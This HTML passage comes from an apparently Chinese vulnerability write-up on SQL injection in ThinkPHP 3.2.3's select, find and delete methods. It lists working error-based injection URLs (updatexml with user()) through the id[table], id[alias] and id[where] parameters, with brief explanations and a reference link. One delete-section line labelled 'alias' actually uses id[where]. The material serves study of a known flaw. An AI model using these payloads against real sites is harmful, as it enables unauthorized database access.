class="cs7FFD2630">：</span><span class="cs9FB05234">http://www.0-sec.org/index.php?m=Home&amp;c=Index&amp;a=test&amp;id[table]=user where%201%20and%20updatexml(1,concat(0x7e,user(),0x7e),1)--</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">alias</span><span class="cs7FFD2630">：</span><span class="cs9FB05234">http://www.0-sec.org/index.php?m=Home&amp;c=Index&amp;a=test&amp;id[alias]=where%201%20and%20updatexml(1,concat(0x7e,user(),0x7e),1)--</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">where: http://www.0-sec.org/index.php?m=Home&amp;c=Index&amp;a=test&amp;id[where]=1%20and%20updatexml(1,concat(0x7e,user(),0x7e),1)--</span></p><p class="cs40DD2BC9"><span><img src="Web安全/Thinkphp/Thinkphp_3.x_漏洞/Thinkphp%203.2.3%20select&find&delete%20%e6%b3%a8%e5%85%a5%e6%bc%8f%e6%b4%9e_files/image3.png" width="560" height="105" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">而</span><span class="cs9FB05234">delete()</span><span class="cs9C1B1871">方法的话同样，这里粗略举三个例子，</span><span class="cs9FB05234">table</span><span class="cs8926E06">,</span><span class="cs9FB05234">alias</span><span class="cs8926E06">,</span><span class="cs9FB05234">where</span><span class="cs9C1B1871">，但使用</span><span class="cs9FB05234">table</span><span class="cs9C1B1871">和</span><span class="cs9FB05234">alias</span><span class="cs9C1B1871">的时候，同时还必须保证</span><span class="cs9FB05234">where</span><span class="cs9C1B1871">不为空（详细原因后面会说）</span></p><p class="cs3A447A38"><span class="cs9FB05234">where: http://www.0-sec.org/index.php?m=Home&amp;c=Index&amp;a=test&amp;id[where]=1%20and%20updatexml(1,concat(0x7e,user(),0x7e),1)--</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">alias: http://www.0-sec.org/index.php?m=Home&amp;c=Index&amp;a=test&amp;id[where]=1%20and%20updatexml(1,concat(0x7e,user(),0x7e),1)--</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">table: http://www.0-sec.org/index.php?m=Home&amp;c=Index&amp;a=test&amp;id[table]=user%20where%201%20and%20updatexml(1,concat(0x7e,user(),0x7e),1)--&amp;id[where]=1</span></p><p class="cs40DD2BC9"><span><img src="Web安全/Thinkphp/Thinkphp_3.x_漏洞/Thinkphp%203.2.3%20select&find&delete%20%e6%b3%a8%e5%85%a5%e6%bc%8f%e6%b4%9e_files/image4.png" width="560" height="96" alt="" style="border-width:0px;" /></span></p><h2 class="cs868C439D">
			<a name="参考链接"><span class="cs83F14626">参考链接</span></a></h2>
		<p class="cs6FD73CFB"><span class="cs8926E06"><a class="cs508254C" href="https://xz.aliyun.com/t/2629#toc-1"><span class="cs4B51D5E4">https://xz.aliyun.com/t/2629#toc-1</span></a></span></p></body>
</html>
